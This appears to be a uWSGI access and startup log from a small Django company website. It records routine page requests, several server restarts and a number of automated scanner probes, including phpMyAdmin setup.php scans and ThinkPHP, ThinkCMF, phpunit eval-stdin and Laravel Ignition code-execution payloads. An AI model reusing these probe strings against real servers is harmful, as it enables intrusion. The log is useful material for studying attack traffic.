+[pid: 23752|app: 0|req: 134/208] 107.172.157.133 () {26 vars in 323 bytes} [Tue Jun  6 22:58:55 2023] GET /webdb/scripts/setup.php => generated 725 bytes in 13 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 135/209] 107.172.157.133 () {26 vars in 325 bytes} [Tue Jun  6 22:58:55 2023] GET /websql/scripts/setup.php => generated 725 bytes in 13 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 136/210] 107.172.157.133 () {26 vars in 335 bytes} [Tue Jun  6 22:58:55 2023] GET /_phpMyAdmin/scripts/setup.php => generated 725 bytes in 13 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 137/211] 107.172.157.133 () {26 vars in 319 bytes} [Tue Jun  6 22:58:55 2023] GET /php/scripts/setup.php => generated 725 bytes in 12 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 138/212] 107.172.157.133 () {26 vars in 345 bytes} [Tue Jun  6 22:58:55 2023] GET /admin/phpmyadmin/scripts/setup.txt => generated 0 bytes in 1 msecs (HTTP/1.0 301) 3 headers in 141 bytes (1 switches on core 0)
+[pid: 23751|app: 0|req: 23/213] 107.172.157.133 () {26 vars in 317 bytes} [Tue Jun  6 22:58:55 2023] GET /db/scripts/setup.php => generated 725 bytes in 13 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23751|app: 0|req: 24/214] 107.172.157.133 () {26 vars in 333 bytes} [Tue Jun  6 22:58:55 2023] GET /sqlmanager/scripts/setup.php => generated 725 bytes in 12 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 139/215] 107.172.157.133 () {26 vars in 337 bytes} [Tue Jun  6 22:58:55 2023] GET /mysqlmanager/scripts/setup.php => generated 725 bytes in 13 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 140/216] 107.172.157.133 () {26 vars in 333 bytes} [Tue Jun  6 22:58:56 2023] GET /phpmanager/scripts/setup.php => generated 725 bytes in 14 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 141/217] 107.172.157.133 () {26 vars in 335 bytes} [Tue Jun  6 22:58:56 2023] GET /php-myadmin/scripts/setup.php => generated 725 bytes in 14 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 142/218] 107.172.157.133 () {26 vars in 335 bytes} [Tue Jun  6 22:58:56 2023] GET /phpmy-admin/scripts/setup.php => generated 725 bytes in 14 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 143/219] 107.172.157.133 () {26 vars in 335 bytes} [Tue Jun  6 22:58:56 2023] GET /mysql-admin/scripts/setup.php => generated 725 bytes in 15 msecs (HTTP/1.0 500) 6 headers in 226 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 144/220] 35.203.210.181 () {30 vars in 594 bytes} [Tue Jun  6 23:17:19 2023] GET / => generated 725 bytes in 694 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 145/221] 198.235.24.149 () {30 vars in 582 bytes} [Tue Jun  6 23:19:18 2023] GET / => generated 725 bytes in 570 msecs (HTTP/1.0 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 146/222] 185.225.74.229 () {40 vars in 667 bytes} [Tue Jun  6 23:33:08 2023] GET /config/getuser?index=0 => generated 0 bytes in 100 msecs (HTTP/1.1 301) 3 headers in 129 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 147/223] 83.97.73.89 () {34 vars in 548 bytes} [Tue Jun  6 23:45:43 2023] GET /?XDEBUG_SESSION_START=phpstorm => generated 725 bytes in 806 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 148/224] 83.97.73.89 () {36 vars in 645 bytes} [Wed Jun  7 00:24:19 2023] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 725 bytes in 253 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.21 (64bit) on [Wed Jun  7 05:04:24 2023] ***
+compiled with version: 11.3.0 on 05 June 2023 09:56:19
+os: Linux-5.15.0-1039-azure #46-Ubuntu SMP Mon May 22 15:18:07 UTC 2023
+nodename: SanyoCare750
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE
+detected binary path: /home/wzr/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+chdir() to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE
+your processes number limit is 3588
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (0.0.0.0:3031).
+bind(): Address already in use [core/socket.c line 769]
+[pid: 23752|app: 0|req: 149/225] 219.78.235.164 () {42 vars in 830 bytes} [Wed Jun  7 01:04:42 2023] GET / => generated 725 bytes in 995 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 150/226] 219.78.235.164 () {44 vars in 861 bytes} [Wed Jun  7 01:04:58 2023] GET / => generated 725 bytes in 3689 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 151/227] 219.78.235.164 () {44 vars in 862 bytes} [Wed Jun  7 01:05:28 2023] GET / => generated 725 bytes in 854 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 23752|app: 0|req: 152/228] 219.78.235.164 () {44 vars in 862 bytes} [Wed Jun  7 01:05:31 2023] GET / => generated 725 bytes in 1347 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 23752|app: 0|req: 153/229] 219.78.235.164 () {44 vars in 862 bytes} [Wed Jun  7 01:05:35 2023] GET / => generated 725 bytes in 1294 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+Wed Jun  7 01:05:47 2023 - uWSGI worker 4 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Jun  7 01:05:47 2023 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Jun  7 01:05:47 2023 - uWSGI worker 3 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Jun  7 01:05:47 2023 - uWSGI worker 2 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Jun  7 01:05:47 2023 - uWSGI worker 4 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Jun  7 01:05:47 2023 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Jun  7 01:05:47 2023 - uWSGI worker 3 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Jun  7 01:05:47 2023 - uWSGI worker 2 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.21 (64bit) on [Wed Jun  7 05:06:00 2023] ***
+compiled with version: 11.3.0 on 05 June 2023 09:56:19
+os: Linux-5.15.0-1039-azure #46-Ubuntu SMP Mon May 22 15:18:07 UTC 2023
+nodename: SanyoCare750
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE
+detected binary path: /home/wzr/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+chdir() to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE
+your processes number limit is 3588
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:3031 fd 3
+Python version: 3.10.6 (main, Mar 10 2023, 10:55:28) [GCC 11.3.0]
+PEP 405 virtualenv detected: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Set PythonHome to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Python main interpreter initialized at 0x56354bf8e8e0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+-----------------PROJECT_ROOT--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE  **** 
+-----------------static--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/static  ****  /static/
+-----------------media--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/media  ****  /media/
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x56354bf8e8e0 pid: 98535 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 98535)
+spawned uWSGI worker 1 (pid: 98538, cores: 2)
+spawned uWSGI worker 2 (pid: 98539, cores: 2)
+spawned uWSGI worker 3 (pid: 98540, cores: 2)
+spawned uWSGI worker 4 (pid: 98541, cores: 2)
+[pid: 98540|app: 0|req: 1/1] 219.78.235.164 () {44 vars in 862 bytes} [Wed Jun  7 01:06:08 2023] GET / => generated 129706 bytes in 820 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 98540|app: 0|req: 2/2] 219.78.235.164 () {44 vars in 887 bytes} [Wed Jun  7 01:06:48 2023] GET /services/ => generated 124333 bytes in 91 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 98540|app: 0|req: 3/3] 219.78.235.164 () {44 vars in 896 bytes} [Wed Jun  7 01:06:50 2023] GET /about-us/ => generated 124291 bytes in 87 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 98540|app: 0|req: 4/4] 219.78.235.164 () {44 vars in 878 bytes} [Wed Jun  7 01:06:52 2023] GET / => generated 129706 bytes in 91 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 98540|app: 0|req: 5/5] 219.78.235.164 () {44 vars in 887 bytes} [Wed Jun  7 01:11:32 2023] GET /services/ => generated 124333 bytes in 106 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 98540|app: 0|req: 6/6] 219.78.235.164 () {44 vars in 896 bytes} [Wed Jun  7 01:11:34 2023] GET /about-us/ => generated 124291 bytes in 89 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 98540|app: 0|req: 7/7] 219.78.235.164 () {44 vars in 892 bytes} [Wed Jun  7 01:11:37 2023] GET /career/ => generated 124280 bytes in 87 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 98540|app: 0|req: 8/8] 219.78.235.164 () {44 vars in 894 bytes} [Wed Jun  7 01:11:38 2023] GET /about-us/ => generated 124291 bytes in 87 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 98540|app: 0|req: 9/9] 219.78.235.164 () {44 vars in 896 bytes} [Wed Jun  7 01:11:40 2023] GET /services/ => generated 124333 bytes in 86 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 98540|app: 0|req: 10/10] 219.78.235.164 () {44 vars in 878 bytes} [Wed Jun  7 01:11:42 2023] GET / => generated 129706 bytes in 90 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 98540|app: 0|req: 11/11] 83.97.73.89 () {34 vars in 712 bytes} [Wed Jun  7 01:12:26 2023] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 => generated 123376 bytes in 55 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 98540|app: 0|req: 12/12] 207.46.13.229 () {42 vars in 659 bytes} [Wed Jun  7 01:17:54 2023] GET /robots.txt => generated 118 bytes in 2 msecs (HTTP/1.1 200) 6 headers in 193 bytes (1 switches on core 1)
+[pid: 98540|app: 0|req: 13/13] 40.77.167.172 () {42 vars in 658 bytes} [Wed Jun  7 01:17:57 2023] GET /about-us/ => generated 124291 bytes in 88 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 98540|app: 0|req: 14/14] 52.167.144.30 () {42 vars in 658 bytes} [Wed Jun  7 01:18:02 2023] GET /services/ => generated 124333 bytes in 87 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 98540|app: 0|req: 15/15] 52.167.144.30 () {42 vars in 640 bytes} [Wed Jun  7 01:18:02 2023] GET / => generated 129706 bytes in 180 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 98540|app: 0|req: 16/16] 40.77.167.117 () {42 vars in 654 bytes} [Wed Jun  7 01:18:07 2023] GET /career/ => generated 124280 bytes in 88 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 98540|app: 0|req: 17/17] 52.167.144.30 () {42 vars in 640 bytes} [Wed Jun  7 01:18:52 2023] GET / => generated 129706 bytes in 90 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 98540|app: 0|req: 18/18] 83.97.73.89 () {34 vars in 548 bytes} [Wed Jun  7 01:26:02 2023] GET /solr/admin/info/system?wt=json => generated 0 bytes in 2 msecs (HTTP/1.1 301) 3 headers in 137 bytes (1 switches on core 1)
+[pid: 98540|app: 0|req: 19/19] 83.97.73.89 () {36 vars in 621 bytes} [Wed Jun  7 01:26:06 2023] GET /solr/admin/info/system/?wt=json => generated 123376 bytes in 70 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 98540|app: 0|req: 20/20] 194.180.48.85 () {48 vars in 873 bytes} [Wed Jun  7 01:45:49 2023] POST /boaform/admin/formLogin => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 130 bytes (1 switches on core 1)
+[pid: 98540|app: 0|req: 21/21] 159.65.32.180 () {30 vars in 380 bytes} [Wed Jun  7 01:55:03 2023] GET / => generated 129706 bytes in 85 msecs (HTTP/1.0 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 98540|app: 0|req: 22/22] 83.97.73.89 () {38 vars in 704 bytes} [Wed Jun  7 02:09:18 2023] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 123376 bytes in 54 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 1)
+Gracefully killing worker 4 (pid: 98541)...
+Gracefully killing worker 2 (pid: 98539)...
+Gracefully killing worker 1 (pid: 98538)...
+Gracefully killing worker 3 (pid: 98540)...
+...gracefully killing workers...
+worker 1 buried after 3 seconds
+worker 2 buried after 3 seconds
+worker 3 buried after 3 seconds
+worker 4 buried after 3 seconds
+binary reloading uWSGI...
+chdir() to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (0.0.0.0:3031)
+running /home/wzr/.local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.21 (64bit) on [Wed Jun  7 02:11:38 2023] ***
+compiled with version: 11.3.0 on 05 June 2023 09:56:19
+os: Linux-5.15.0-1039-azure #46-Ubuntu SMP Mon May 22 15:18:07 UTC 2023
+nodename: SanyoCare750
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE
+detected binary path: /home/wzr/.local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+chdir() to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE
+your processes number limit is 3588
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 0.0.0.0:3031 fd 3
+Python version: 3.10.6 (main, Mar 10 2023, 10:55:28) [GCC 11.3.0]
+PEP 405 virtualenv detected: /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Set PythonHome to /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/myenv
+Python main interpreter initialized at 0x55beb2735ec0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+-----------------PROJECT_ROOT--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/SANYO_CARE  **** 
+-----------------static--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/static  ****  /static/
+-----------------media--- /home/wzr/SANYO_CARE_WEBSITE/SANYO_CARE_WEB/SANYO_CARE/media  ****  /media/
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x55beb2735ec0 pid: 98535 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 98535)
+spawned uWSGI worker 1 (pid: 99598, cores: 2)
+spawned uWSGI worker 2 (pid: 99599, cores: 2)
+spawned uWSGI worker 3 (pid: 99600, cores: 2)
+spawned uWSGI worker 4 (pid: 99601, cores: 2)
+[pid: 99601|app: 0|req: 1/1] 159.65.32.180 () {36 vars in 464 bytes} [Wed Jun  7 02:22:32 2023] GET / => generated 129706 bytes in 763 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 2/2] 45.128.232.62 () {40 vars in 562 bytes} [Wed Jun  7 03:34:11 2023] GET / => generated 129706 bytes in 301194 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 4/3] 162.142.125.12 () {34 vars in 438 bytes} [Wed Jun  7 04:17:13 2023] GET / => generated 725 bytes in 1053071 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 4/4] 167.248.133.124 () {34 vars in 439 bytes} [Wed Jun  7 04:17:46 2023] GET / => generated 725 bytes in 1020544 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 1)
+[pid: 99600|app: 0|req: 2/5] 167.94.138.34 () {34 vars in 437 bytes} [Wed Jun  7 04:17:29 2023] GET / => generated 725 bytes in 1040416 msecs (HTTP/1.1 500) 7 headers in 240 bytes (1 switches on core 0)
+[pid: 99600|app: 0|req: 2/6] 83.97.73.89 () {38 vars in 628 bytes} [Wed Jun  7 03:59:20 2023] POST /Autodiscover/Autodiscover.xml => generated 725 bytes in 2129670 msecs (HTTP/1.1 500) 6 headers in 226 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 5/7] 2.57.122.83 () {48 vars in 871 bytes} [Wed Jun  7 04:41:17 2023] POST /boaform/admin/formLogin => generated 0 bytes in 11 msecs (HTTP/1.1 301) 3 headers in 130 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 6/8] 83.97.73.89 () {36 vars in 616 bytes} [Wed Jun  7 05:01:46 2023] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 123376 bytes in 176 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 7/9] 83.97.73.89 () {36 vars in 594 bytes} [Wed Jun  7 05:06:58 2023] GET /_ignition/execute-solution => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 133 bytes (1 switches on core 0)
+[pid: 99598|app: 0|req: 1/10] 83.97.73.89 () {38 vars in 663 bytes} [Wed Jun  7 05:06:59 2023] GET /_ignition/execute-solution/ => generated 123376 bytes in 955 msecs (HTTP/1.1 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99598|app: 0|req: 2/11] 198.11.181.69 () {26 vars in 331 bytes} [Wed Jun  7 05:25:15 2023] GET /phpMyAdmin/scripts/setup.php => generated 123376 bytes in 252 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 8/12] 198.11.181.69 () {26 vars in 331 bytes} [Wed Jun  7 05:25:15 2023] GET /phpmyadmin/scripts/setup.php => generated 123376 bytes in 46 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 9/13] 198.11.181.69 () {26 vars in 345 bytes} [Wed Jun  7 05:25:15 2023] GET /phpMyAdmin-2.11.4/scripts/setup.php => generated 123376 bytes in 44 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 10/14] 198.11.181.69 () {26 vars in 345 bytes} [Wed Jun  7 05:25:16 2023] GET /phpMyAdmin-2.11.3/scripts/setup.php => generated 123376 bytes in 45 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 11/15] 198.11.181.69 () {26 vars in 349 bytes} [Wed Jun  7 05:25:16 2023] GET /phpMyAdmin-2.10.0.2/scripts/setup.php => generated 123376 bytes in 48 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 12/16] 198.11.181.69 () {26 vars in 345 bytes} [Wed Jun  7 05:25:16 2023] GET /phpMyAdmin-2.10.3/scripts/setup.php => generated 123376 bytes in 45 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 13/17] 198.11.181.69 () {26 vars in 347 bytes} [Wed Jun  7 05:25:17 2023] GET /phpMyAdmin-2.8.0.2/scripts/setup.php => generated 123376 bytes in 45 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 14/18] 198.11.181.69 () {26 vars in 345 bytes} [Wed Jun  7 05:25:17 2023] GET /phpMyAdmin-2.10.2/scripts/setup.php => generated 123376 bytes in 141 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 15/19] 198.11.181.69 () {26 vars in 349 bytes} [Wed Jun  7 05:25:17 2023] GET /phpMyAdmin-2.11.9.2/scripts/setup.php => generated 123376 bytes in 50 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 16/20] 198.11.181.69 () {26 vars in 345 bytes} [Wed Jun  7 05:25:18 2023] GET /phpMyAdmin-2.11.0/scripts/setup.php => generated 123376 bytes in 46 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 17/21] 198.11.181.69 () {26 vars in 345 bytes} [Wed Jun  7 05:25:18 2023] GET /phpMyAdmin-2.11.7/scripts/setup.php => generated 123376 bytes in 46 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 18/22] 198.11.181.69 () {26 vars in 349 bytes} [Wed Jun  7 05:25:18 2023] GET /phpMyAdmin-2.11.1.2/scripts/setup.php => generated 123376 bytes in 45 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 19/23] 198.11.181.69 () {26 vars in 317 bytes} [Wed Jun  7 05:25:18 2023] GET /pma/scripts/setup.php => generated 123376 bytes in 47 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 20/24] 198.11.181.69 () {26 vars in 333 bytes} [Wed Jun  7 05:25:19 2023] GET /phpMyAdmin3/scripts/setup.php => generated 123376 bytes in 46 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 21/25] 198.11.181.69 () {26 vars in 325 bytes} [Wed Jun  7 05:25:19 2023] GET /myadmin/scripts/setup.php => generated 123376 bytes in 45 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 22/26] 198.11.181.69 () {26 vars in 325 bytes} [Wed Jun  7 05:25:19 2023] GET /MyAdmin/scripts/setup.php => generated 123376 bytes in 44 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 23/27] 198.11.181.69 () {26 vars in 331 bytes} [Wed Jun  7 05:25:19 2023] GET /PHPMYADMIN/scripts/setup.php => generated 123376 bytes in 45 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 24/28] 198.11.181.69 () {26 vars in 331 bytes} [Wed Jun  7 05:25:19 2023] GET /mysqladmin/scripts/setup.php => generated 123376 bytes in 44 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 25/29] 198.11.181.69 () {26 vars in 317 bytes} [Wed Jun  7 05:25:20 2023] GET /SQL/scripts/setup.php => generated 123376 bytes in 44 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 26/30] 198.11.181.69 () {26 vars in 351 bytes} [Wed Jun  7 05:25:20 2023] GET /phpMyAdmin-2.5.5-pl1/scripts/setup.php => generated 123376 bytes in 44 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 27/31] 198.11.181.69 () {26 vars in 343 bytes} [Wed Jun  7 05:25:20 2023] GET /phpMyAdmin-2.5.5/scripts/setup.php => generated 123376 bytes in 44 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 28/32] 198.11.181.69 () {26 vars in 343 bytes} [Wed Jun  7 05:25:21 2023] GET /phpMyAdmin-2.5.4/scripts/setup.php => generated 123376 bytes in 44 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 29/33] 198.11.181.69 () {26 vars in 351 bytes} [Wed Jun  7 05:25:21 2023] GET /phpMyAdmin-2.5.7-pl1/scripts/setup.php => generated 123376 bytes in 44 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 30/34] 198.11.181.69 () {26 vars in 329 bytes} [Wed Jun  7 05:25:22 2023] GET /admin/pma/scripts/setup.php => generated 0 bytes in 1 msecs (HTTP/1.0 301) 3 headers in 134 bytes (1 switches on core 0)
+[pid: 99600|app: 0|req: 3/35] 198.11.181.69 () {26 vars in 335 bytes} [Wed Jun  7 05:25:22 2023] GET /phpMyAdmin-2/scripts/setup.php => generated 123376 bytes in 319 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99600|app: 0|req: 4/36] 198.11.181.69 () {26 vars in 339 bytes} [Wed Jun  7 05:25:23 2023] GET /web/phpMyAdmin/scripts/setup.php => generated 123376 bytes in 952 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 31/37] 198.11.181.69 () {26 vars in 327 bytes} [Wed Jun  7 05:25:24 2023] GET /webadmin/scripts/setup.php => generated 123376 bytes in 902 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 32/38] 198.11.181.69 () {26 vars in 321 bytes} [Wed Jun  7 05:25:27 2023] GET /admin/scripts/setup.php => generated 0 bytes in 9 msecs (HTTP/1.0 301) 3 headers in 130 bytes (1 switches on core 1)
+[pid: 99598|app: 0|req: 3/39] 198.11.181.69 () {26 vars in 325 bytes} [Wed Jun  7 05:25:28 2023] GET /dbadmin/scripts/setup.php => generated 123376 bytes in 600 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99598|app: 0|req: 4/40] 198.11.181.69 () {26 vars in 321 bytes} [Wed Jun  7 05:25:29 2023] GET /mysql/scripts/setup.php => generated 123376 bytes in 1043 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 33/41] 198.11.181.69 () {26 vars in 333 bytes} [Wed Jun  7 05:25:30 2023] GET /phpMyAdmin2/scripts/setup.php => generated 123376 bytes in 652 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
+[pid: 99601|app: 0|req: 34/42] 198.11.181.69 () {26 vars in 321 bytes} [Wed Jun  7 05:25:31 2023] GET /phpma/scripts/setup.php => generated 123376 bytes in 853 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 1)
+[pid: 99601|app: 0|req: 35/43] 198.11.181.69 () {26 vars in 323 bytes} [Wed Jun  7 05:25:32 2023] GET /sqlweb/scripts/setup.php => generated 123376 bytes in 869 msecs (HTTP/1.0 404) 7 headers in 231 bytes (1 switches on core 0)
